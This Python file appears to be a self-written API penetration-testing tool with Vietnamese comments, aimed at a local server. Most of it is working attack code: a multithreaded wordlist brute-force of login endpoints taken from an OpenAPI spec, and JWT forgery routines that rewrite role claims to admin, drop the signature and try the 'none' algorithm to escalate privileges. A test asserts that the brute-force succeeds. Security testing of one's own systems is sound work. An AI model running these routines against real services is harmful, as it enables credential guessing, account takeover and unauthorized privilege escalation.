import itertools
import concurrent.futures
import threading
import base64
import json

from security_function import SecurityFunction

url = "http://127.0.0.1:8000"
open_api = "http://127.0.0.1:8000/openapi.json"

class MyTester(SecurityFunction):
    #======Phan nay la phan Broken Auth =======
    #Tạo list đệm lưu trữ tạm thời cho mỗi lần chạy hạn chế chạy lại
    wordlist_cache = None
    #Khi gọi sẽ tạo ra wordlist để brute force
    def wordlist_storage_cache(self):
        self.wordlist_cache = {
            "email": self.load_wordlist("wordlist/email.txt"),
            "username": self.load_wordlist("wordlist/user.txt"),
            "password": self.load_wordlist("wordlist/password.txt"), 
            "id" : [1],
            "role" : ["admin"],   
            "grant": ["password"], 
            "client": [""],        
            "scope": [""]
        }

    #Tạo wordlist dựa trên tên trường và kiểu dữ liệu và định dạng
    def brute_force_map_wordlist(self,field_name,field_type,field_format):
        #Chuẩn hóa đầu vào
        check = field_name.lower()
        #Nếu wordlist trống thì tạo
        if self.wordlist_cache is None:
            self.wordlist_storage_cache()

        #Nếu trong wordlist có tên trường trùng với trường đầu vào thì trả về wordlist đấy
        for key,wordlist in self.wordlist_cache.items():
            if key in check:
                return wordlist
        #Nếu ko dò được tên trường thì tiếp đến cái này
        type_and_format_check = {
            ("string",None) : self.wordlist_cache.get("username"),
            ("integer",None): [1],
            ("boolean",None): [True,False]
        }
        #Trả về wordlist theo tên trường, nếu vẫn không ra thì điền tạm thành None
        return type_and_format_check.get((field_type,field_format),["None"])
    
    #Tạo 1 wordlist với dạng {field_name : {1 wordlist khác}}
    def all_in_one_wordlist(self,input_endpoint):
        list_of_all = {}
        #Duyệt endpoint để lấy wordlist theo endpoint
        for endpoints,schema in self.get_endpoint_map().items():
            endpoint = endpoints.split()[0]
            #Nếu trùng thì mới lấy tên trường và type format để điền vào hàm tạo wordlist
            if endpoint == input_endpoint:
                for schemas,property in self.get_component_map().items():

                    if schemas == schema:
                        for field_name,type_format in property.items():

                            f_type = type_format.get("type")
                            f_format = type_format.get("format")

                            list_of_all[field_name] = self.brute_force_map_wordlist(field_name,f_type,f_format)
        
        return list_of_all
                        
    #Tạo công việc cho mỗi thằng worker trong threading
    #stop_even yêu cầu để biết khi nào dừng ?
    def worker_threading(self,endpoint,payload,stop_event):
        #Nếu stop_event = True thì sẽ dừng hàm luôn
        if stop_event.is_set():
            return False
        
        try:

            shoot = self.post_data(endpoint,payload)

            if shoot.status_code == 200:
                data = shoot.json()
                token = data.get("access_token")
                #Nếu tìm thấy token thì ấn còi báo dừng
                if token:
                    stop_event.set()
                    return True
            else:
                shoot = self._xu_ly_yeu_cau("POST",endpoint,json=payload)
                if shoot.status_code == 200:
                    print("Da hack thanh cong")
                    data = shoot.json()
                    token = data.get("access_token")
                    if token:
                        stop_event.set()
                        return True
                    else:
                        print("Khong co token ?? honey pot ???")
                
        except Exception as e:
            print(f"Loi roi {e}")


    def Brute_force(self):
        lo_hong = False
        #Cred là để lưu thông tin đăng nhập nếu bruteforce thành công
        cred = {}
        found = False

        #Duyệt theo endpoint, schema và method chỉ thêm vào cho có, schema thêm vào để chạy vòng lặp
        #cho nó trả về key:value
        for endpoints,schema in self.get_endpoint_map().items():
            end = endpoints.split()[0]
            method = endpoints.split()[1]

            #Tạo wordlist
            wordlists_all = self.all_in_one_wordlist(end)

            #Lấy keys(tên trường ví dụ : username)
            #Trả về ['keys1','keys2',...]
            keys = list(wordlists_all.keys())

            
            #Check nếu tên trường có yêu cầu username và pass word
            has_pass = any("pass" in k.lower() for k in keys)
            has_user = any("user" in k.lower() for k in keys)

            if not (has_user and has_pass):
                continue
            
            #Nếu có thì mới lấy phần wordlist tương ứng với mỗi trường
            #Ví dụ: username : {['admin','admin123','trungduy',...]}
            #thì wordlists (tên biến bên dưới) nó chính là những cái list đằng sau [admin,...]
            #Nó tạo thành 1 list [['admin','admin123',...],['password','password1',...]...]
            wordlists = list(wordlists_all.values())

            #Combination này là tổ hợp các wordlist trộn vào để tạo payload
            #Ở đây phần quan trọng cần biết là thư viện itertools thư viện này sử dụng để tạo payload dựa trên wordlist 
            #Cần nắm rõ ở đây là:
            # itertool.product sẽ nhận vào 1 danh sách(list) các danh sách nghĩa là trùng định dạng với cái wordlist tạo bên trên
            #sau đấy nó sẽ nhân tích đề các lên để tạo thành các tổ hợp như [(admin,password),...]
            #xong ép về kiểu list là xong phần tổ hợp
            combinations = list(itertools.product(*wordlists))
            total_pays = len(combinations)
            print(f"Shooting tổng cộng {total_pays} payloads")

            #Tạo cái chuông cho từng thằng công nhân của bố Duy dùng đây
            stop_event = threading.Event()

            #Đây là tạo ra 1 trình quản lý trong đó (max_workers) ở đây là xin cpu cấp 50 luồng (thread)
            #Lưu ý nhé ae: executors ở đây không phải là đối tượng tự đi làm mà nó là thằng quản lý 50 cái luồng kia
            #
            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executors:

                future_all = []

                for combo in combinations:
                    #zip là để gióng thẳng key với combo ví dụ thế này này
                    #   ^   keys [username,password]
                    #   |   combo ('admin','password')
                    #   |   index    0          1

                    #==> nó sẽ ra căp mới là [('username','admin')]
                    #==> sau đó ép kiểu dict thành {'username':'admin'} ==> đúng json payload
                    payload = dict(zip(keys,combo))
                    #hàm submit có thể hiểu như giao việc với (param1 = hàm cần làm không ngoặc,các tham số trong hàm cần làm)
                    future = executors.submit(self.worker_threading,end,payload,stop_event)
                    cred[future] = combo
                    future_all.append(future)

                #hàm as_completed(param) nghĩa là thay vì chạy tuần tự, thì nó sẽ đọc theo thằng nào xong trước thì lên trước 

                for future in concurrent.futures.as_completed(future_all):
                    if future.result() == True:
                        lo_hong = True
                        found = True
                        #Nếu tìm thấy thì bấm chuông
                        stop_event.set()


                        #Nếu tìm thấy thì hủy toàn bộ những cái hóa đơn đang đợi thực hiện đi
                        for f in future_all:
                            f.cancel()
                        break

            if found == True:
                print(cred[future])
                break
            
        return lo_hong

    def jwt_scan_field(self,token_json):
        predetermine_keys = ["role", "admin", "is_admin", "privilege", "access_level"]

        for key in token_json.items():
            if key.lower() in predetermine_keys:
                if isinstance(key,str):
                    token_json[key] = "admin"
                elif isinstance(key,bool):
                    token_json[key] = True
                elif isinstance(key,int):
                    token_json[key] = 1
        
        return token_json

    
    #Tại sao cần pad ở phần này ? Vì cơ chế của mã base64 thì yêu cầu độ dài đoạn văn bản phải là bội của 4 (chia hết cho 4) 
    #và base64 sử dụng dấu "=" để đánh dấu kí tự thừa và tự động xóa sau khi mã xong
    def padding64(self,data):
        needed = len(data) % 4

        if needed != 0 :
            data += "=" * (4 - needed)
        
        return data
    
    #Thay đổi jwt token với điều kiên CẦN LOGIN_ENDPOINT và VALID CREDENTIAL để lấy token
    #Sẽ xóa phần .signature ở cuối để xem server có kiểm tra không ?
    def jwt_manipulation_payload(self,user_and_pass,login_endpoint):
        username = user_and_pass.get("username")
        password = user_and_pass.get("password")
        user_cred = {
            "username":f"{username}",
            "password":f"{password}"
        }

        take_token = self.post_data(login_endpoint,user_cred)

        if take_token.status_code == 200:
            data = take_token.json()
            token = data.get("access_token")

            if token:
                part1 = token.split(".")[0]
                part2 = token.split(".")[1]
                #Theo chuẩn base64 thì sau khi decode thì sẽ chuyển về byte và đánh dấu bằng b'' và dùng decode utf-8 để bỏ cái b'' đi
                #Và định dạng trả về của phần decode này là string
                dec_p1 = base64.urlsafe_b64decode(self.padding64(part1)).decode('utf-8')
                dec_p2 = base64.urlsafe_b64decode(self.padding64(part2)).decode('utf-8')

                #Do đó ở đây sử dung json để ép về dạng dictionary
                p2_dict = json.loads(dec_p2)

                payload_p2 = self.jwt_scan_field(p2_dict)

                str_payload_p2 = json.dumps(payload_p2)
                enc_pay_p2 = base64.urlsafe_b64encode(self.padding64(str_payload_p2).encode('utf-8')).decode('utf-8')
                payload_last = part1 + "." + enc_pay_p2 + "."

                header_pay = {
                    "Authorization" : f"Bearer {payload_last}"
                }

                shoot = self._xu_ly_yeu_cau("GET","/users",headers = header_pay)
                if shoot.status_code in [400,401,402]:
                    print("jwt manipulation thất bại, hệ thống chặn được chỉnh sửa token")
                elif shoot.status_code == 200:
                    print("Thành công leo thang đặc quyền !!")
                    
            else:
                print("no token")
        else:
            print("Dn thất bại")


    def jwt_none_algro(self,user_and_pass,login_endpoint):
        username = user_and_pass.get("username")
        password = user_and_pass.get("password")
        user_cred = {
            "username":f"{username}",
            "password":f"{password}"
        }

        take_token = self.post_data(login_endpoint,user_cred)

        if take_token.status_code == 200:
            data = take_token.json()
            token = data.get("access_token")

            if token:
                part1 = token.split(".")[0]
                part2 = token.split(".")[1]
                #Theo chuẩn base64 thì sau khi decode thì sẽ chuyển về byte và đánh dấu bằng b'' và dùng decode utf-8 để bỏ cái b'' đi
                #Và định dạng trả về của phần decode này là string
                dec_p1 = base64.urlsafe_b64decode(self.padding64(part1)).decode('utf-8')
                dec_p2 = base64.urlsafe_b64decode(self.padding64(part2)).decode('utf-8')

                #Do đó ở đây sử dung json để ép về dạng dictionary
                p1_dict = json.loads(dec_p1)
                p2_dict = json.loads(dec_p2)

                payload_p2 = self.jwt_scan_field(p2_dict)

                str_payload_p2 = json.dumps(payload_p2)
                enc_pay_p2 = base64.urlsafe_b64encode(str_payload_p2.encode('utf-8')).decode('utf-8').rstrip("=")

                none_alg = ["none","None","NONE"]

                for alg in none_alg:
                    
                    payload_p1 = p1_dict
                    payload_p1["alg"] = alg


                    str_payload_p1 = json.dumps(payload_p1)

                    enc_pay_p1 = base64.urlsafe_b64encode(self.padding64(str_payload_p1).encode('utf-8')).decode('utf-8').rstrip("=")
 
                    payload_last = enc_pay_p1 + "." + enc_pay_p2 + "."

                    header_pay = {
                        "Authorization" : f"Bearer {payload_last}"
                    }

                    shoot = self._xu_ly_yeu_cau("GET","/users",headers = header_pay)
                    if shoot.status_code in [400,401,402,403]:
                        print("jwt manipulation thất bại, hệ thống chặn được chỉnh sửa token")
                    elif shoot.status_code == 200:
                        print("Thành công leo thang đặc quyền !!")
                    
            else:
                print("no token")
        else:
            print("Dn thất bại")



tool = MyTester(url)

u1_cred = {
    "username":"duynt",
    "password":"duynt"
}
tool.jwt_manipulation_payload(u1_cred,"/token")





def test_brute_force_admin_login():
    """
    Kịch bản: Tấn công Brute-force vào form đăng nhập để chiếm quyền Admin.
    Kỳ vọng: Lấy được Access Token và trả về True.
    """
    print("  [KỊCH BẢN] BRUTE-FORCE ADMIN")

    tool = MyTester(url)

    ket_qua = tool.Brute_force() 

    assert ket_qua == True, "Thất bại"
    
    # Nếu Pass (Màu xanh), nó sẽ in dòng này:
    print("\nPASSED: Đã bẻ khóa thành công! ")
